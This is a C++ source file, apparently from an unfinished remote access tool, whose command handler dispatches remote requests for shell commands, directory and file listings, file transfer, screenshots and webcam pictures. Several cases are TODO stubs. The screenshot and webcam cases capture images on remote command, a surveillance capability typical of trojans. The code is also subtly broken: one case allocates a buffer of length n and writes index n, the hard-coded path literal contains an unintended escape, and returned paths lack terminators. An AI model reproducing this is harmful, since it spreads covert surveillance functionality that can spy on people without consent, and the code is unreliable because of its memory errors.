#include "CommandHandler.h"

CommandHandler::CommandHandler() : scrshot(1)
{
	
}

CommandHandler::~CommandHandler()
{

}

CMDPacket CommandHandler::Execute(CMDPacket request)
{
	DWORD data_len = 0;
	LPBYTE data = NULL;
	LPTSTR request_path = NULL;
	LPCTSTR response_path = NULL;

	switch (request.GetType()) {
	case CMDPacket::CMDType::SHELL_COMMAND:	// return the output of the command
		//TODO
		break;
	case CMDPacket::CMDType::DRIVE_LIST:	// return list of drives letters
		//TODO
		break;
	case CMDPacket::CMDType::DIR_LIST:		// return list of the file names
		//TODO
		break;
	case CMDPacket::CMDType::FILE_TRANSFER: // return the content of the file
		// get the file path from the request
		request_path = new TCHAR[request.GetDataLength() + 1];
		memcpy_s(request_path, request.GetDataLength(), request.GetData(), request.GetDataLength());
		request_path[request.GetDataLength()] = '\0';
		//TODO
		break;
	case CMDPacket::CMDType::THUMBNAILS:	// return filepath of the output image
		// get the dir path from the request
		request_path = new TCHAR[request.GetDataLength()];
		memcpy_s(request_path, request.GetDataLength(), request.GetData(), request.GetDataLength());
		request_path[request.GetDataLength()] = '\0';

		response_path = GenerateTempFilePath();
		data_len = strnlen_s(response_path, MAX_PATH);
		data = new BYTE[data_len];
		thumbnail.Create(request_path, response_path);
		memcpy_s(data, data_len, response_path, strnlen_s(response_path, MAX_PATH));
		delete[] response_path;
		delete[] request_path;
		break;
	case CMDPacket::CMDType::SCREENSHOT:	// return filepath of the output image
		response_path = GenerateTempFilePath();
		data_len = strnlen_s(response_path, MAX_PATH);
		data = new BYTE[data_len];
		scrshot.CaptureAnImage(response_path);
		memcpy_s(data, data_len, response_path, strnlen_s(response_path, MAX_PATH));
		delete[] response_path;
		break;
	case CMDPacket::CMDType::PICTURE:		// return filepath of the output image
		response_path = GenerateTempFilePath();
		data_len = strnlen_s(response_path, MAX_PATH);
		data = new BYTE[data_len];
		camera.TakePicture(response_path);
		memcpy_s(data, data_len, response_path, strnlen_s(response_path, MAX_PATH));
		delete[] response_path;
		break;
	default:
		
		break;
	}
	
	CMDPacket response(request.GetType(), request.GetDataProcessing(), request.GetDataProcessingParam(), data, data_len);

	return response;
}

LPCTSTR CommandHandler::GenerateTempFilePath()
{
	LPTSTR path = new TCHAR[MAX_PATH + 1];

	strncpy_s(path, MAX_PATH, TEXT("D:\file.bmp"), strnlen(TEXT("D:\file.bmp"), MAX_PATH));

	return path;
}